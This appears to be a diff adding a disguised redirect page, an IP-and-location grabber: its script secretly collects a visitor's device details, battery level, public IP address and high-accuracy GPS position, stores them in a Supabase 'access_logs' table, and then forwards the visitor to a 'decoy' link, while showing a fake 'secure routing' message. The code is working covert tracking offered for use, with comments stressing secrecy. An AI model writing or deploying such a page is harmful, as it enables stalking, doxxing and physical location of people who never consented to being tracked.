@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <!-- Include Supabase Library -->
+    <script src="https://jsdelivr.net"></script>
+</head>
+<body style="background: #f4f4f4;">
+    <p style="font-family: monospace; color: #333; text-align: center; margin-top: 20%; font-size: 18px;" id="msg">Establishing secure routing channel...</p>
+
+    <script>
+        // CONFIGURATION LAYER - Linked to your active Supabase Instance
+        const SUPABASE_URL = "https://supabase.co";
+        const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InloZXJuYW53b3phYnBtYW5veWlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwNzg4OTcsImV4cCI6MjEwMDY1NDg5N30.YwMaRYcZkeGPTySRs34d7Cg0jr4MGR71WHkCQGkv6FA";
+        const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const linkToken = urlParams.get('c'); 
+
+        async function fireAndRedirect(payload, redirectUrl) {
+            // Save everything secretly to your cloud database
+            await _supabase.from('access_logs').insert([payload]);
+            // Instantly bounce the person to the real link
+            window.location.href = redirectUrl;
+        }
+
+        function parseDeviceData() {
+            const ua = navigator.userAgent;
+            let os = "Unknown OS";
+            if (/android/i.test(ua)) os = "Android Mobile";
+            else if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) os = "Apple iOS Mobile";
+            else if (/Macintosh/i.test(ua)) os = "macOS Desktop";
+            else if (/Windows NT/i.test(ua)) os = "Windows Desktop";
+            return { os: os, platform: navigator.platform, cores: navigator.hardwareConcurrency || "N/A" };
+        }
+
+        window.addEventListener('DOMContentLoaded', async () => {
+            if (!linkToken) {
+                document.getElementById('msg').innerText = "Routing Failure: Invalid Parameters.";
+                return;
+            }
+
+            // Find where this link is supposed to redirect to
+            const { data: linkData, error } = await _supabase.from('tracking_links').select('destination_url').eq('token', linkToken).single();
+            if (error || !linkData) {
+                document.getElementById('msg').innerText = "Link reference does not exist.";
+                return;
+            }
+
+            const decoyUrl = linkData.destination_url;
+            const device = parseDeviceData();
+
+            let payload = {
+                associated_token: linkToken,
+                device_os: device.os,
+                platform: device.platform,
+                cpu_cores: String(device.cores),
+                screen_resolution: `${window.screen.width}x${window.screen.height}`,
+                public_ip: "Unavailable",
+                battery_charge: "N/A"
+            };
+
+            // Grab Battery status quietly
+            try {
+                const b = await navigator.getBattery();
+                payload.battery_charge = `${Math.round(b.level * 100)}%`;
+            } catch(e){}
+
+            // Grab IP Address quietly
+            try {
+                const ipRes = await fetch('https://ipify.org');
+                const ipData = await ipRes.json();
+                payload.public_ip = ipData.ip;
+            } catch(err){}
+
+            // Request GPS Permissions via browser popup
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    async (pos) => {
+                        payload.gps_latitude = pos.coords.latitude;
+                        payload.gps_longitude = pos.coords.longitude;
+                        payload.gps_accuracy = pos.coords.accuracy;
+                        await fireAndRedirect(payload, decoyUrl);
+                    },
+                    async () => { 
+                        // If they block GPS, still execute database write and redirect
+                        await fireAndRedirect(payload, decoyUrl); 
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                await fireAndRedirect(payload, decoyUrl);
+            }
+        });
+    </script>
+</body>
+</html>
